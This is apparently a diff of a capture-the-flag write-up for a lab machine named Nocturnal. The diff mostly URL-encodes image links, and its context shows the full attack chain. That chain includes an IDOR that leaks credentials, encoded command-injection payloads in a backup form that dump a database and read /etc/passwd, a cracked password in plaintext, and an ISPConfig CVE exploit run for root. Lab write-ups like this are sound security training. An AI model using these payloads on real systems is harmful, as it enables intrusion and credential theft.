@@ -32,7 +32,7 @@ echo 'IP nocturnal.htb' | sudo tee -a /etc/hosts
 We can check the following:
 
 
-![](Pasted image 20250414131950.png)
+![](Pasted%20image%2020250414131950.png)
 
 We can begin fuzzing:
 
@@ -75,7 +75,7 @@ dashboard.php           [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 106
 
 Got a few interesting directories, for example, the `view.php` seems weird, if we check it up, we find this:
 
-![](Pasted image 20250414133917.png)
+![](Pasted%20image%2020250414133917.png)
 
 It means we need a parameter, let's fuzz for parameters, I will use `arjun` for this, we can install it using:
 
@@ -134,7 +134,7 @@ tobias                  [Status: 200, Size: 3037, Words: 1174, Lines: 129, Durat
 
 We found some users, for example, the `amanda` and `tobias` usernames seems weird, knowing the usernames, we can now check the url again and use the username:
 
-![](Pasted image 20250414145432.png)
+![](Pasted%20image%2020250414145432.png)
 
 Still getting the invalid file extension, if we remember them right, we can use any of them:
 
@@ -145,7 +145,7 @@ http://nocturnal.htb/view.php?username=amanda&file=.pdf
 We get this:
 
 
-![](Pasted image 20250414145506.png)
+![](Pasted%20image%2020250414145506.png)
 
 There is a hidden file inside: `privacy.odt`, we can download it:
 
@@ -169,12 +169,12 @@ unzip privacy.odt -d privacy_content
 
 We get this:
 
-![](Pasted image 20250414145630.png)
+![](Pasted%20image%2020250414145630.png)
 
 If we check content.xml, we can see the following:
 
 
-![](Pasted image 20250414145723.png)
+![](Pasted%20image%2020250414145723.png)
 
 There we go, we got credentials for `amanda`:
 
@@ -194,17 +194,17 @@ These credentials only work in the web application, not on ssh, let's proceed wi
 
 If we log with the credentials we got, we can see this:
 
-![](Pasted image 20250414145853.png)
+![](Pasted%20image%2020250414145853.png)
 
 
 We got a `nocturnal_database.db.pdf` file, we can try checking it first:
 
 
-![](Pasted image 20250414150119.png)
+![](Pasted%20image%2020250414150119.png)
 
 It seems like there's a hidden database, I tried getting it with curl but it does not work, let's proceed to the admin panel:
 
-![](Pasted image 20250414150944.png)
+![](Pasted%20image%2020250414150944.png)
 
 We are able to create backups on here, I tried creating a backup to check if the database was in here but it wasn't, an interesting founding I got was when I read the source code for `admin.php`, we can see this:
 
@@ -478,7 +478,7 @@ After testing some payloads, I was able to exploit the `id` command with the fol
 password=%0Abash%09-c%09"id"%0A&backup=Create+Backup
 ```
 
-![](Pasted image 20250414172644.png)
+![](Pasted%20image%2020250414172644.png)
 
 I tried getting a shell at this point but was unable to do it, it seems the server kind of interpret the input but is unable to get us a shell, let's look around the machine, if we remember correctly, there's a `nocturnal_database.db` file at `/nocturnal_database`, if we check the contents of this directory, we can find this:
 
@@ -486,7 +486,7 @@ I tried getting a shell at this point but was unable to do it, it seems the serv
 password=%0Abash%09-c%09"ls%09-la%09/var/www/nocturnal_database"%0A&backup=Create+Backup
 ```
 
-![](Pasted image 20250414172837.png)
+![](Pasted%20image%2020250414172837.png)
 
 There it is, we can use `base64` to get the file into our local machine:
 
@@ -494,7 +494,7 @@ There it is, we can use `base64` to get the file into our local machine:
 password=%0Abash%09-c%09"base64%09/var/www/nocturnal_database/nocturnal_database.db"%0A&backup=Create+Backup
 ```
 
-![](Pasted image 20250414172949.png)
+![](Pasted%20image%2020250414172949.png)
 
 We need to copy the content of it and do:
 
@@ -505,7 +505,7 @@ echo 'BASE64 STRING' | base64 -d > nocturnal_database.db
 
 With this, we can now analyze the file using `sqlitebrowser`:
 
-![](Pasted image 20250414173043.png)
+![](Pasted%20image%2020250414173043.png)
 
 We see some hashes, we can try using the command injection to check which user has a bash console, since cat is disabled with this, we can try head:
 
@@ -513,12 +513,12 @@ We see some hashes, we can try using the command injection to check which user h
 password=%0Abash%09-c%09"head%09-n%0950%09/etc/passwd"%0A&backup=Create+Backup
 ```
 
-![](Pasted image 20250414173258.png)
+![](Pasted%20image%2020250414173258.png)
 
 Seems like the user we need is `tobias`, let's crack the hash, it is a simple `md5` hash:
 
 
-![](Pasted image 20250414173336.png)
+![](Pasted%20image%2020250414173336.png)
 
 
 There we go, we finally got credentials:
@@ -529,7 +529,7 @@ tobias:slowmotionapocalypse
 
 We can go to ssh with these:
 
-![](Pasted image 20250414173415.png)
+![](Pasted%20image%2020250414173415.png)
 
 Let's go with privilege escalation.
 
@@ -546,7 +546,7 @@ tobias@nocturnal:~$ cat user.txt
 
 We can use `linpeas` to check for any PE vector:
 
-![](Pasted image 20250414174019.png)
+![](Pasted%20image%2020250414174019.png)
 
 Seems weird, if we keep analyzing the output from linpeas, we can see something called `ispconfig`, since we got another website open, let's use port forwarding to check the contents of it:
 
@@ -554,15 +554,15 @@ Seems weird, if we keep analyzing the output from linpeas, we can see something 
 ssh tobias@nocturnal.htb -L 9090:127.0.0.1:8080
 ```
 
-![](Pasted image 20250414174209.png)
+![](Pasted%20image%2020250414174209.png)
 
 There we go, we are dealing with something called `ISPCONFIG`, we can try checking the version in the source code:
 
-![](Pasted image 20250414174241.png)
+![](Pasted%20image%2020250414174241.png)
 
 So, `ispconfig 3.2`, let's search for an exploit:
 
-![](Pasted image 20250414174330.png)
+![](Pasted%20image%2020250414174330.png)
 
 We got `CVE-2023-46818`, let's search an exploit and use it:
 
@@ -570,7 +570,7 @@ We got `CVE-2023-46818`, let's search an exploit and use it:
 EXPLOIT: https://github.com/bipbopbup/CVE-2023-46818-python-exploit
 ```
 
-![](Pasted image 20250414174412.png)
+![](Pasted%20image%2020250414174412.png)
 
 Let's get it, we need to do this:
 
@@ -580,7 +580,7 @@ python exploit.py http://127.0.0.1:9090 admin slowmotionapocalypse
 
 We can see this output:
 
-![](Pasted image 20250414174551.png)
+![](Pasted%20image%2020250414174551.png)
 
 There we go, we can finally read root shell and finish the CTF.
 
